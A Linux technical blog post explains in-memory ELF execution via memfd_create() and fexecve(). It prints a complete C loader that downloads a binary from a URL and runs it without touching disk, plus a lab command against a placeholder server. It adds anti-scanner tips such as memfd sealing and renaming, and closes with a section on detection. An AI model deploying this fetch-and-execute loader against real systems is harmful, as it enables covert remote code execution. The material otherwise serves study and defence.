---
title: ELF execution from RAM
date: 2026-02-25
tag: LINUX
description: A small Linux loader experiment using memfd_create() and fexecve(), with a look at what memory-backed execution does and does not hide.
---

# ELF execution from RAM

I built a small C loader that downloads an ELF and executes it from memory. The experiment started with a narrow question: what changes when the executable never receives a normal path on disk?

A dropped binary gives an analyst a durable artifact. It can be hashed, reversed, scanned for strings and configuration, and correlated with network activity. Moving execution to an anonymous file descriptor removes that particular source of evidence.

It does not make the process invisible. The process, network activity, and execution behavior remain observable. This is an exercise in reducing filesystem artifacts, not a claim of "fileless" stealth.

## The loud path

Running the binary directly is the easy version.

It is also the version that leaves the cleanest trail for whoever arrives after you.

An unsigned executable lands in an unusual directory. An analyst collects it, recovers its configuration, and correlates it with the network trail. The file provides both the artifact and the starting point for the investigation.

Memory-backed execution removes the dropped executable and some obvious file I/O. That is useful against controls focused heavily on files, but it changes only one part of the execution chain.

## The Linux primitive

Linux gives you the pieces.

`memfd_create()` creates an anonymous file backed by memory. From the kernel's perspective, it behaves like a file descriptor. From the filesystem's perspective, there is no normal path sitting on disk waiting to be collected.

```c
int memfd_create(const char *name, unsigned int flags);
```

`fexecve()` executes a program from an open file descriptor.

```c
int fexecve(int fd, char *const argv[], char *const envp[]);
```

That is the trick: fetch bytes, write them into the anonymous descriptor, execute the descriptor. The kernel cares about a valid ELF and a readable fd. It does not need a pathname.

`fexecve()` is a glibc wrapper. On glibc 2.27 and newer it uses `execveat()` when the kernel supports it; older implementations fall back to `/proc/self/fd/<n>`. Calling `execveat()` directly makes the intended kernel interface explicit:

```c
execveat(memfd, "", argv, envp, AT_EMPTY_PATH);
```

With `AT_EMPTY_PATH`, the descriptor is enough and no pathname is required.

`MFD_ALLOW_SEALING` is worth using too. Pass it alongside `MFD_CLOEXEC`, then after writing call `fcntl(memfd, F_ADD_SEALS, F_SEAL_WRITE | F_SEAL_SHRINK | F_SEAL_GROW)`. The fd goes read-only. A scanner hitting it mid-read sees a frozen object.

These details matter because "fileless" describes the missing filesystem path, not the absence of evidence.

## The loader

Full source is on [GitHub](https://github.com/proxydom/nodiskloader).

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <curl/curl.h>

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001
#endif

int memfd_create(const char *name, unsigned int flags) {
    return syscall(SYS_memfd_create, name, flags);
}

struct MemoryBuffer {
    char *data;
    size_t size;
};

size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
    size_t total = size * nmemb;
    struct MemoryBuffer *mem = (struct MemoryBuffer *)userdata;

    char *tmp = realloc(mem->data, mem->size + total);
    if (!tmp) return 0;

    mem->data = tmp;
    memcpy(&(mem->data[mem->size]), ptr, total);
    mem->size += total;
    return total;
}

int load_elf_from_url(const char *url) {
    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL *curl = curl_easy_init();
    if (!curl) {
        curl_global_cleanup();
        return -1;
    }

    struct MemoryBuffer bin = {0};

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &bin);
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK || bin.size == 0) {
        fprintf(stderr, "Failed to download binary.\n");
        free(bin.data);
        curl_global_cleanup();
        return -1;
    }

    int memfd = memfd_create("inmem", MFD_CLOEXEC);
    if (memfd < 0) {
        perror("memfd_create");
        free(bin.data);
        curl_global_cleanup();
        return -1;
    }

    size_t written = 0;
    while (written < bin.size) {
        ssize_t n = write(memfd, bin.data + written, bin.size - written);
        if (n <= 0) {
            perror("write to memfd");
            free(bin.data);
            close(memfd);
            curl_global_cleanup();
            return -1;
        }
        written += (size_t)n;
    }

    free(bin.data);

    char *argv[] = {"inmem_exec", NULL};
    char *envp[] = {NULL};

    fexecve(memfd, argv, envp);

    perror("fexecve");
    close(memfd);
    curl_global_cleanup();
    return -1;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <url_to_ELF_binary>\n", argv[0]);
        return EXIT_FAILURE;
    }

    return load_elf_from_url(argv[1]);
}
```

## Running it in a lab

```bash
gcc -o elfloader loader.c -lcurl
./elfloader https://your-server.com/binary
```

No dropped executable, and no temporary file. The loader feeds bytes into an anonymous fd and lets the kernel do the rest.

Two implementation details matter here. `curl_global_init()` belongs before libcurl work, and `write()` needs a loop because one call is not guaranteed to consume the entire buffer.

I left the environment empty in the lab sample. That's fine for a controlled toy, but real programs can care about boring things like `PATH`, `HOME`, locale, and loader-related variables. If the payload expects a normal userland environment, passing `{NULL}` can turn your clean trick into a weird crash.

## The defensive side

File-based detection does not cover this by itself.

The process and file descriptor are still visible. On Linux, `/proc/<pid>/fd/` can expose a `memfd:inmem` entry, including the name passed to `memfd_create()`. Changing that name may defeat a trivial string match, but it does not hide the underlying pattern. An outbound download followed by execution from an anonymous descriptor is still useful behavioral context.

The environment matters too. Seccomp, AppArmor, SELinux, container policy, and hardened profiles can block or constrain the technique. The primitive is useful, but the host policy still determines whether it works.

The useful defensive answer is correlation across process, network, and descriptor activity.

## The lesson

Executing an ELF from a memory-backed descriptor is a practical way to avoid a conventional dropped executable. It also demonstrates the limit of file-centric visibility.

Removing the disk artifact does not erase evidence, it moves the investigation toward process behavior, open descriptors, and network activity. That distinction is the useful part of the experiment.
